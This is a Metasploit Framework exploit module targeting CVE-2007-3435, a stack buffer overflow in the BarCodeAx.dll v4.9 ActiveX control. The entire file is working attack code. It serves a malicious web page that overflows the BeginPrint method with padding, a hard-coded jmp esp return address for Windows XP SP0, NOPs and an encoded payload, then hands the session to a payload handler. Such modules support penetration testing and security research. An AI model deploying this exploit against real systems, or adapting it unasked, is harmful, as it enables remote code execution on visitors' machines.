##
# $Id: barcode_ax49.rb 9262 2010-05-09 17:45:00Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::HttpServer::HTML

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'RKD Software BarCodeAx.dll v4.9 ActiveX Remote Stack Buffer Overflow',
			'Description'    => %q{
				This module exploits a stack buffer overflow in RKD Software Barcode Application
				ActiveX Control 'BarCodeAx.dll'. By sending an overly long string to the BeginPrint
				method of BarCodeAx.dll v4.9, an attacker may be able to execute arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'Trancek <trancek[at]yashira.org>', 'patrick' ],
			'Version'        => '$Revision: 9262 $',
			'References'     =>
				[
					[ 'URL', 'http://www.milw0rm.com/exploits/4094' ],
					[ 'OSVDB', '37482' ],
					[ 'BID', '24596' ],
					[ 'CVE', '2007-3435' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Payload'        =>
				{
					'Space'         => 1024,
					'BadChars' => "\x00\x0a\x0d\x20\'\"%<>@=,.\#$&()\\/",
					'StackAdjustment' => -3500,
				},
			'Platform'       => 'win',
			'Targets'        =>
				[
					[ 'Windows XP SP0 English', { 'Ret' => 0x71ab7bfb } ] # jmp esp ws2_32.dll patrickw xpsp0
				],
			'DisclosureDate' => 'Jun 22 2007',
			'DefaultTarget'  => 0))
	end

	def autofilter
		false
	end

	def check_dependencies
		use_zlib
	end

	def on_request_uri(cli, request)
		# Re-generate the payload
		return if ((p = regenerate_payload(cli)) == nil)

		# Randomize some things
		vname = rand_text_alpha(rand(100) + 1)

		buff = Rex::Text.rand_text_alphanumeric(656) + [target['Ret']].pack('V') + make_nops(20) + payload.encoded

		# Build out the message
		content = %Q|<html>
<object classid='clsid:C26D9CA8-6747-11D5-AD4B-C01857C10000' id='#{vname}'></object>
<script language='javascript'>
#{vname}.BeginPrint("#{buff}");
</script>
</html>
|

		print_status("Sending exploit to #{cli.peerhost}:#{cli.peerport}...")

		# Transmit the response to the client
		send_response_html(cli, content)

		# Handle the payload
		handler(cli)
	end

end